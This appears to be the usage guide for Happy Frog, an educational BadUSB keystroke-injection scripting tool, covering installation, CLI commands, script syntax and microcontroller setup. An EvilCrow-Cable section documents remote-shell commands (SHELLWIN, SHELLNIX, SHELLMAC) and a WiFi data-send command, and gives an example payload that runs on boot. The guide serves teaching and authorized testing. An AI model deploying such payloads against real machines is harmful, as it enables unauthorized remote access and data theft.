# 🐸 Happy Frog Usage Guide

Welcome to Happy Frog! This comprehensive guide will walk you through using Happy Frog for educational cybersecurity purposes. **Remember: This tool is for authorized testing and education only.**

##  Legal and Ethical Guidelines

Before using Happy Frog, you **MUST** understand and agree to these guidelines:

### ✅ Permitted Uses
- Educational cybersecurity labs
- Authorized penetration testing with written permission
- Red team exercises in controlled environments
- Security research on systems you own
- Teaching cybersecurity concepts

### ❌ Prohibited Uses
- Unauthorized access to any systems
- Malicious attacks or cybercrime
- Testing without explicit permission
- Any illegal activities

**By using this tool, you accept full responsibility for ensuring your use is legal and ethical.**

---

##  Quick Start

### Installation Options

#### Option 1: Install from PyPI (Recommended)
```bash
# Install the latest version
pip install happy-frog #(latest)

# Install a specific version
pip install happy-frog==0.2.4 #(stable)

# Verify installation
happy-frog --help
```

#### Option 2: Development Installation
```bash
# Clone the repository
git clone https://github.com/ZeroDumb/happy-frog.git
cd happy-frog

# Install in development mode
pip install -e .

# Or install dependencies directly
pip install -r requirements.txt
```

### Your First Script

1. **List available sample payloads:**
   ```bash
   happy-frog list-payloads
   ```

2. **Copy a sample payload to your working directory:**
   ```bash
   happy-frog copy-payload hello_world.txt ./my_script.txt
   ```

3. **Generate device code:**
   ```bash
   happy-frog encode my_script.txt -d xiao_rp2040 -o output.py
   ```

4. **Upload to your device and test!**

---

##  Hardware Requirements

### Recommended Hardware

####  **Seeed Xiao RP2040** (~$5-8) - **Primary Recommendation**
- **Why**: Affordable, powerful, easy to use
- **Buy from**: [Seeed Studio](https://www.seeedstudio.com/XIAO-RP2040-v1-0-p-5026.html) | [Amazon](https://www.amazon.com/s?k=seeed+xiao+rp2040) | [Adafruit](https://www.adafruit.com/product/4864)
- **Specs**: Dual-core ARM, 264KB RAM, 2MB Flash, USB-C

####  **Raspberry Pi Pico** (~$4-6)
- **Why**: Official Raspberry Pi product, same chip as Xiao
- **Buy from**: [Raspberry Pi Store](https://www.raspberrypi.com/products/raspberry-pi-pico/) | [Amazon](https://www.amazon.com/s?k=raspberry+pi+pico)
- **Specs**: Same RP2040 chip, slightly larger form factor

####  **Budget Option: DigiSpark** (~$2-4)
- **Why**: Ultra-cheap, very small
- **Buy from**: [Amazon](https://www.amazon.com/s?k=digispark+attiny85) | [eBay](https://www.ebay.com/sch/i.html?_nkw=digispark+attiny85)
- **Specs**: ATtiny85, 8KB flash, 512B RAM

####  **Advanced Option: EvilCrow-Cable** (~$15-30)
- **Why**: Specialized BadUSB device with built-in USB-C connectors
- **Buy from**: [Rabbit-Labs](https://rabbit-labs.com/) | [DIY Build](https://github.com/joelsernamoreno/EvilCrow-Cable/blob/master/README.md)
- **Specs**: ATtiny85, 8KB flash, 512B RAM, built-in USB-C
- **Note**: Advanced users only - designed for cybersecurity research

### Software Requirements
- **Computer**: Windows, Mac, or Linux
- **Python**: Version 3.7 or higher
- **USB Cable**: USB-C (Xiao/Pico) or Micro-USB (DigiSpark)
- **Text Editor**: VS Code, Notepad++, or any text editor

---

##  CLI Reference

### Available Commands

```bash
# Parse and analyze a script
happy-frog parse <input_file> [--verbose]

# Encode script to device-specific code
happy-frog encode <input_file> [-o output] [--device device] [--production] [--verbose]

# Validate a script for errors
happy-frog validate <input_file> [--verbose]

# Convert Ducky Script to Happy Frog Script
happy-frog convert <input_file> [-o output] [--verbose]

# List available sample payloads
happy-frog list-payloads

# Copy a sample payload to destination
happy-frog copy-payload <payload_name> <destination>
```

### Command Details

#### Parse Command
```bash
happy-frog parse my_script.txt
happy-frog parse my_script.txt --verbose
```
- **Purpose**: Analyze script structure and validate syntax
- **Output**: Shows command count, line count, and any warnings

#### Encode Command
```bash
# Basic encoding
happy-frog encode my_script.txt

# Device-specific encoding
happy-frog encode my_script.txt -d xiao_rp2040

# Production mode (runs immediately on boot)
happy-frog encode my_script.txt -d xiao_rp2040 -p

# Custom output location
happy-frog encode my_script.txt -o custom_output.py

# Verbose output with code preview
happy-frog encode my_script.txt --verbose
```

#### Validate Command
```bash
happy-frog validate my_script.txt
happy-frog validate my_script.txt --verbose
```
- **Purpose**: Check script for syntax errors and potential issues
- **Output**: Shows validation results and warnings

#### Convert Command
```bash
happy-frog convert ducky_script.txt
happy-frog convert ducky_script.txt -o converted_script.txt
```
- **Purpose**: Convert legacy Ducky Script to modern Happy Frog Script format

#### List Payloads Command
```bash
happy-frog list-payloads
```
- **Purpose**: Show all available sample payloads included with Happy Frog

#### Copy Payload Command
```bash
happy-frog copy-payload hello_world.txt ./my_script.txt
```
- **Purpose**: Copy a sample payload to your working directory

### Device Selection

Use `--device (-d)` to generate code for specific microcontrollers:

| Device ID | Name | Output Format | Status |
|-----------|------|---------------|--------|
| `xiao_rp2040` | Seeed Xiao RP2040 (recommended) | `.py` | ✅ **Production Ready** |
| `raspberry_pi_pico` | Raspberry Pi Pico | `.py` | ✅ **Production Ready** |
| `arduino_leonardo` | Arduino Leonardo | `.ino` | ✅ **Production Ready** |
| `teensy_4` | Teensy 4.0 | `.ino` | ✅ **Production Ready** |
| `digispark` | DigiSpark | `.ino` | ✅ **Production Ready** |
| `esp32` | ESP32 (Bluetooth HID) | `.ino` | ✅ **Production Ready** |
| `evilcrow_cable` | EvilCrow-Cable (WiFi BadUSB) | `.ino` | ✅ **Production Ready** |
| `android` | Android Device (Mobile Automation) | `.ino` | ✅ **Production Ready** |

### Production Mode

The `--production (-p)` flag generates code that runs immediately on boot:
- **Educational Mode** (default): Includes `main()` function, requires manual execution
- **Production Mode**: Code runs automatically when device boots (uses ATTACKMODE)

---

##  Writing Happy Frog Scripts

Happy Frog Script is a simple scripting language for automating keyboard input. It's compatible with Ducky Script but includes additional features.

### Basic Commands

#### Timing Commands
```txt
DELAY 1000          # Wait for 1 second
DEFAULT_DELAY 500   # Set default delay for all commands
RANDOM_DELAY 200 800 # Random delay between 200-800ms
```

#### Input Commands
```txt
STRING Hello World! # Type text
ENTER              # Press Enter key
SPACE              # Press Space key
TAB                # Press Tab key
BACKSPACE          # Press Backspace key
DELETE             # Press Delete key
```

#### Navigation Commands
```txt
UP                 # Up arrow
DOWN               # Down arrow
LEFT               # Left arrow
RIGHT              # Right arrow
HOME               # Home key
END                # End key
PAGE_UP            # Page Up key
PAGE_DOWN          # Page Down key
```

#### Function Keys
```txt
F1 F2 F3 F4 F5 F6 F7 F8 F9 F10 F11 F12
```

#### Modifier Keys
```txt
CTRL               # Control key
SHIFT              # Shift key
ALT                # Alt key
MOD                # Windows/Command/Super key
```

#### Key Combinations
```txt
MOD r              # Windows+R (Run dialog)
CTRL c             # Copy
CTRL v             # Paste
CTRL ALT DEL       # Task Manager
SHIFT F1           # Help
```

#### Special Commands
```txt
ATTACKMODE         # Enable immediate execution on boot
# This is a comment
REM This is also a comment
```

### Advanced Features (Happy Frog Exclusive)

#### Conditional Logic
```txt
IF system_windows
STRING Windows system detected
ELSE
STRING Non-Windows system detected
ENDIF
```

#### Loops
```txt
WHILE counter < 3
STRING Loop iteration
ENTER
RANDOM_DELAY 100 300
ENDWHILE
```

#### Logging and Validation
```txt
LOG Starting automation sequence
VALIDATE system_windows
```

### Example Scripts

#### Simple Greeting
```txt
# Simple greeting script
DELAY 2000
STRING Hello from Happy Frog!
ENTER
STRING This is for educational purposes only!
ENTER
```

#### Open Command Prompt (Windows)
```txt
# Open Windows Command Prompt
DELAY 2000
MOD r
DELAY 500
STRING cmd
ENTER
DELAY 1000
STRING echo Hello World!
ENTER
DELAY 500
STRING exit
ENTER
```

#### Educational Demo with Advanced Features
```txt
# Educational demonstration with Happy Frog features
DEFAULT_DELAY 500
LOG Starting educational demo

IF system_windows
STRING Windows system detected
ELSE
STRING Non-Windows system detected
ENDIF

WHILE counter < 3
STRING Loop iteration
ENTER
RANDOM_DELAY 100 300
ENDWHILE

STRING Thank you for learning about cybersecurity!
ENTER
```

---

##  Hardware Setup

### Step-by-Step Microcontroller Setup

#### For Seeed Xiao RP2040 (Recommended)

1. **Download CircuitPython:**
   - Go to [circuitpython.org](https://circuitpython.org/)
   - Find "Seeed XIAO RP2040" in the board list
   - Download the `.uf2` file

2. **Enter bootloader mode:**
   - Connect your Xiao RP2040 via USB-C
   - **Double-tap the reset button** (small button on the board)
   - Your computer should show a new USB drive named `RPI-RP2`

3. **Install CircuitPython:**
   - Copy the downloaded `.uf2` file to the `RPI-RP2` drive
   - The device will restart automatically
   - You should now see a `CIRCUITPY` drive

4. **Install required libraries:**
   - Go to [circuitpython.org/libraries](https://circuitpython.org/libraries)
   - Download the latest library bundle
   - Extract the bundle
   - Create a `lib` folder on your `CIRCUITPY` drive
   - Copy these folders to `lib`:
     - `adafruit_hid`
     - `adafruit_hid.keyboard`
     - `adafruit_hid.keyboard_layout_us`
     - `adafruit_hid.keycode`

#### For Other Devices
- **Raspberry Pi Pico**: Follow same steps as Xiao RP2040 (same chip)
- **DigiSpark**: Requires Arduino IDE setup (see `docs/microcontrollers.md`)
- **Other devices**: See `docs/microcontrollers.md` for detailed instructions

### Testing Your Device

1. **Create a test script:**
   ```bash
   happy-frog copy-payload hello_world.txt ./test_script.txt
   ```

2. **Generate device code:**
   ```bash
   happy-frog encode test_script.txt -d xiao_rp2040 -o test_output.py
   ```

3. **Upload to device:**
   - Copy `test_output.py` to your `CIRCUITPY` drive as `code.py`
   - The device will automatically run the code

4. **Test:**
   - Connect to a test computer
   - Observe the automated input behavior
   - **Always test in controlled environments**

---

##  Safety and Best Practices

### Physical Security
- **Store devices securely** when not in use
- **Label your devices** clearly as educational tools
- **Keep inventory** of all your devices
- **Never leave devices** in public or unsecured areas

### Operational Security
- **Test only on systems you own** or have explicit permission
- **Use isolated test environments** when possible
- **Disconnect from networks** during testing
- **Monitor for unexpected behavior**

### Testing Environments

#### Option 1: Virtual Machine (Recommended)
- **VM Software**: Use VirtualBox, VMware, or Hyper-V
- **Isolated Environment**: No access to host system or network
- **Snapshot Before Testing**: Create restore points
- **Disconnect Network**: Remove network adapters during testing

#### Option 2: Dedicated Test Machine
- **Old Laptop**: Use a spare/old computer
- **No Important Data**: Wipe and reinstall OS
- **No Network**: Disconnect WiFi/Ethernet
- **No Personal Accounts**: Use test accounts only

#### Option 3: Live USB/DVD
- **Linux Live USB**: Ubuntu, Kali Linux, or Tails
- **No Installation**: Runs from USB without affecting system
- **Temporary**: No permanent changes

### Educational Best Practices
- **Document everything** you do
- **Get written permission** before testing on any system
- **Report vulnerabilities** responsibly if found
- **Share knowledge** with the cybersecurity community

---

##  Educational Concepts

Happy Frog demonstrates several important cybersecurity concepts:

### HID Attacks
- **What**: Devices that emulate human input
- **How**: Bypass software security at the input level
- **Defense**: Physical security and device monitoring

### Code Generation
- **What**: Converting high-level scripts to executable code
- **How**: Parsing and translation techniques
- **Application**: Understanding how automation works

### Microcontroller Security
- **What**: Security implications of embedded devices
- **How**: Devices can be programmed for various purposes
- **Defense**: Secure development and deployment practices

---

## 🎯 EvilCrow-Cable Specialty Commands

The EvilCrow-Cable device supports advanced BadUSB operations with WiFi capabilities. These specialty commands are unique to the EvilCrow-Cable and provide enhanced functionality for cybersecurity research and education.

### Available Specialty Commands

#### **RELEASE** - Release All Keys
```bash
RELEASE
```
Releases all currently pressed keys. Useful for cleaning up key states after complex operations.

#### **WIFI_SEND** - Send Data Over WiFi
```bash
WIFI_SEND Hello WiFi World!
```
Sends data over the WiFi serial connection. Requires WiFi module setup.

#### **WIFI_CONNECT** - Connect to WiFi Network
```bash
WIFI_CONNECT MyNetwork MyPassword
```
Connects to a WiFi network using the specified SSID and password.

#### **SHELLWIN** - Windows Remote Shell
```bash
SHELLWIN 192.168.1.100
```
Triggers a Windows remote shell connection to the specified IP address.

#### **SHELLNIX** - Linux Remote Shell
```bash
SHELLNIX 192.168.1.101
```
Triggers a Linux remote shell connection to the specified IP address.

#### **SHELLMAC** - macOS Remote Shell
```bash
SHELLMAC 192.168.1.102
```
Triggers a macOS remote shell connection to the specified IP address.

### Example EvilCrow-Cable Payload

```bash
# EvilCrow-Cable Advanced Payload Example
ATTACKMODE HID WIFI
DELAY 2000

# Basic HID operations
STRING Hello from EvilCrow-Cable!
ENTER
DELAY 1000

# WiFi operations
WIFI_SEND Status: Device connected
DELAY 500
WIFI_CONNECT MyNetwork MyPassword
DELAY 2000

# Remote shell operations
SHELLWIN 192.168.1.100
DELAY 1000
SHELLNIX 192.168.1.101
DELAY 1000

# Key management
CTRL
SHIFT
DELAY 500
RELEASE
DELAY 500

# Final message
STRING EvilCrow-Cable payload completed!
ENTER
```

### Using EvilCrow-Cable with Happy Frog

1. **Generate EvilCrow-Cable code:**
   ```bash
   happy-frog encode my_script.txt -d evilcrow_cable -o output.ino
   ```

2. **Production mode (runs immediately on boot):**
   ```bash
   happy-frog encode my_script.txt -d evilcrow_cable --production -o output.ino
   ```

3. **Upload to device:**
   - Use Arduino IDE with EvilCrow-Cable board support
   - Upload the generated `.ino` file to your device

### EvilCrow-Cable Setup Requirements

1. **Hardware Setup**
   - EvilCrow-Cable device with ATtiny85 processor
   - WiFi module connected to RX/TX pins (2, 3)
   - USB-C or USB-A connector (depending on model)

2. **Software Requirements**
   - Arduino IDE with EvilCrow-Cable board support
   - DigiKeyboard library
   - SoftwareSerial library (built-in)

3. **WiFi Module Configuration**
   - Baud rate: 115200
   - Pins: RX=2, TX=3
   - Compatible with ESP8266/ESP32 WiFi modules

##  Troubleshooting

### Common Issues

#### Device Not Recognized
- **Check USB cable** - try a different cable
- **Check USB port** - try a different port
- **Restart device** - unplug and reconnect
- **Check drivers** - may need to install drivers

#### Code Not Running
- **Check file name** - must be `code.py`
- **Check syntax** - look for Python errors
- **Check libraries** - ensure `adafruit_hid` is installed
- **Check CircuitPython** - ensure firmware is installed

#### Script Not Working
- **Check delays** - add longer delays if needed
- **Check target system** - ensure it's ready for input
- **Check permissions** - ensure you have permission to test
- **Check script syntax** - validate with `happy-frog validate script.txt`

#### CLI Issues
- **Check installation** - run `happy-frog --help`
- **Check file paths** - ensure files exist and are accessible
- **Check permissions** - ensure output directory is writable

### Getting Help

1. **Use the CLI help:**
   ```bash
   happy-frog --help
   happy-frog encode --help
   happy-frog validate --help
   ```

2. **Check the documentation:**
   - `docs/microcontrollers.md` - Hardware setup guide
   - `docs/How_We_Are_Different.md` - What sets Happy Frog apart

3. **Look at examples:**
   ```bash
   happy-frog list-payloads
   happy-frog copy-payload hello_world.txt ./example.txt
   ```

4. **Join the community:**
   - GitHub Issues: [Report bugs or ask questions](https://github.com/ZeroDumb/happy-frog/issues)
   - GitHub Discussions: [Share ideas and get help](https://github.com/ZeroDumb/happy-frog/discussions)

---

##  Additional Resources

- [CircuitPython Documentation](https://docs.circuitpython.org/)
- [Adafruit HID Library](https://github.com/adafruit/Adafruit_CircuitPython_HID)
- [USB HID Specification](https://www.usb.org/document-library/device-class-definition-hid-111)
- [Cybersecurity Education Resources](https://www.sans.org/cyber-security-courses/)

---

##  Congratulations!

You've successfully learned how to:
- ✅ Install and use Happy Frog
- ✅ Write and validate Happy Frog Scripts
- ✅ Generate device-specific code
- ✅ Set up microcontrollers safely
- ✅ Use advanced features like production mode
- ✅ Access sample payloads and examples

**Remember:** With great power comes great responsibility. Use Happy Frog to learn, teach, and improve cybersecurity - always ethically and legally!

---

##  Support and Community

- **GitHub Repository**: [https://github.com/ZeroDumb/happy-frog](https://github.com/ZeroDumb/happy-frog)
- **Issues**: [https://github.com/ZeroDumb/happy-frog/issues](https://github.com/ZeroDumb/happy-frog/issues)
- **Discussions**: [https://github.com/ZeroDumb/happy-frog/discussions](https://github.com/ZeroDumb/happy-frog/discussions)
- **Documentation**: [https://github.com/ZeroDumb/happy-frog/tree/main/docs](https://github.com/ZeroDumb/happy-frog/tree/main/docs)

**Happy learning! 🐸** 